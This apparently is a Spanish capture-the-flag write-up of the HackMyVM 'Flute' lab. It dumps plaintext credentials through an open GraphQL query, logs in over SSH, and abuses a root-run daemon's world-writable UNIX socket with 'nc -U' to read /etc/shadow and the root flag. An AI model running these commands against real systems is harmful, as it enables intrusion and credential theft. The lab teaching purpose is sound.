---
title: "Hackmyvm: Flute"
author: datadiego
draft: false
description: Maquina vulnerable flute
date: 2025-07-20
# la fecha va en formato año-mes-dia
tags:
  - pentesting
layout: layouts/post.njk
---

Descargada de [aqui](https://downloads.hackmyvm.eu/flute.zip), en esta máquina debemos encontrar dos flags para completarla.

## Reconocimiento

Desde nmap con `-sV` obtenemos:

```bash
Nmap scan report for 192.168.0.69
Host is up (0.000055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 10.0 (protocol 2.0)
8888/tcp open  sun-answerbook?
```

En el puerto 22 hay un servicio ssh, en el 8888 encontramos un servidor web con un `Apollo`, un servidor de GraphQL.

## Servicio web

El servicio web nos deja lanzar queries contra una base de datos.

Tiene una tabla de `Users` con dos columnas, `username` y `password`.

Lanzamos una query para obtener ambas columnas:

```
query ExampleQuery {
  users {
    username, password
  }
}
```

Obtenemos lo siguiente:

```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "password": "imtherealadmin"
      },
      {
        "username": "hamelin",
        "password": "comewithmerats"
      }
    ]
  }
}
```

## SSH

El usuario `admin` con la contraseña `iamtherealadmin` no funciona, pero `hamelin` si:

```bash
glitch-kitchen master  ❯ ssh admin@192.168.0.69
The authenticity of host '192.168.0.69 (192.168.0.69)' can't be established.
ED25519 key fingerprint is: SHA256:pQL6MCusRtFF6QNd7BL9RBACLaGEw9epVnuBo3D9ETc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.69' (ED25519) to the list of known hosts.
admin@192.168.0.69's password:
Permission denied, please try again.
admin@192.168.0.69's password:
Permission denied, please try again.
admin@192.168.0.69's password:


glitch-kitchen master  ✗ ssh hamelin@192.168.0.69
hamelin@192.168.0.69's password:
HackMyVM Flute.
flute:~$ whoami
hamelin
flute:~$
```

## Explorando con hamelin

Hay los siguientes usuarios:

```
flute:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
hamelin:x:1000:1000::/home/hamelin:/bin/sh
```

En su `home` encontramos lo siguiente:

```bash
flute:~$ whoami
hamelin
flute:~$ pwd
/home/hamelin
flute:~$ ls
index.js           package-lock.json  user.txt
node_modules       package.json
flute:~$ cat user.txt
HMVuser9f4ndbaz4chc6j04b3va
```

`index.js` es el servidor que hay en el puerto 8888, hay un txt con un string, contiene la palabra `user`.

En `tmp` encontramos lo siguiente:

```bash
flute:~$ ls /tmp/
ratd.sock
flute:~$ cat /tmp/ratd.sock
cat: can't open '/tmp/ratd.sock': No such device or address
```

Ejecutamos `linpeas`, el resultado se encuentra en `linpeas.txt`

Linpeas encuentra un programa en `/opt` que tiene que ver con el archivo de `tmp`:

```bash
flute:~$ tree /opt/
/opt/
└── ratd
    └── ratd.py
flute:~$ ls -la /opt/ratd/
total 12
drwxr-xr-x    2 root     root          4096 Mar 30 09:42 .
drwxr-xr-x    3 root     root          4096 Mar 30 09:41 ..
-rw-r--r--    1 root     root           527 Mar 30 09:42 ratd.py
```

Es un script de python:

```python
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

El script nos deja ejecutar comandos a través de un socket UNIX, en esta linea:

```bash
os.chmod(socket_path, 0o777)
```

Se da permiso a todos los usuarios para conectarse a través de `/tmp/ratd.socket`.

Con el usuario actual no podemos ni leer ni editar `/tmp/ratd.sock` ni editar o ejecutar el `.py`:

```bash
flute:~$ python3 /opt/ratd/ratd.py
Traceback (most recent call last):
  File "/opt/ratd/ratd.py", line 8, in <module>
    os.remove(socket_path)
PermissionError: [Errno 1] Operation not permitted: '/tmp/ratd.sock'
flute:~$ cat /tmp/ratd.sock
cat: can't open '/tmp/ratd.sock': No such device or address
```

Sin embargo, no hace falta ejecutarlo, mirando con pstree:

```bash
flute:~$ pstree -p
init(1)-+-acpid(2153)
        |-crond(2179)-+-node(2182)-+-{DelayedTaskSche}(2265)
        |             |            |-{node}(2266)
        |             |            |-{node}(2267)
        |             |            |-{node}(2268)
        |             |            |-{node}(2269)
        |             |            `-{node}(2270)
        |             `-python3(2187)
        |-getty(2243)
        |-getty(2244)
        |-getty(2248)
        |-getty(2253)
        |-getty(2257)
        |-getty(2260)
        |-ntpd(2207)
        |-sshd(2249)---sshd-session(2276)---sshd-session(2278)---sh(2279)---pstree(20763)
        |-syslogd(2126)
        `-udhcpc(2066)
```

Vemos que hay un proceso de python3, si buscamos el PID o ratd con `ps aux`:

```bash
flute:~$ ps aux | grep ratd
 2187 root      0:00 /usr/bin/python3 /opt/ratd/ratd.py
20774 hamelin   0:00 grep ratd
```

Asi que podemos conectarnos usando `nc -U /tmp/ratd.sock` y ejecutar comandos como root directamente:

```bash
flute:~$ nc -U /tmp/ratd.sock
RUN cat /etc/shadow > /tmp/shadow
OK
flute:~$ cat /tmp/shadow
root:$6$lKLVkBPLE7X8DT58$YqnZ8UaA6mDzrLNgAxUpx59jtQVtCVpypJBGQFzFDyaCDEe1y9XOKApm3eVFSvZ/yXSjgeCMp9svRT1gvGN4t0:20542:0:::::
bin:!::0:::::
daemon:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
games:!::0:::::
ntp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
klogd:!:20542:0:99999:7:::
hamelin:$6$eQldCKVD3lXniza0$e1Nbapd0OuJWkNfNSPotctZ1IF7RsF9GBo3jkEgT7h/E2MyEBkGkXZ5c4EpuOsfFNbc/qcxm.gH/.6OvBQWB80:20542:0:99999:7:::
```


Hay un archivo en `/root`:

```bash
RUN ls /root > /tmp/resp
OK
flute:~$ cat /tmp/resp
root.txt
flute:~$ nc -U /tmp/ratd.sock
RUN cat /root/root.txt > /tmp/root.txt
OK
flute:~$ cat /tmp/root.txt
HMVrootoepsamqu0liphzzsc7x9
```

Hemos conseguido las dos `flags` de la VM.

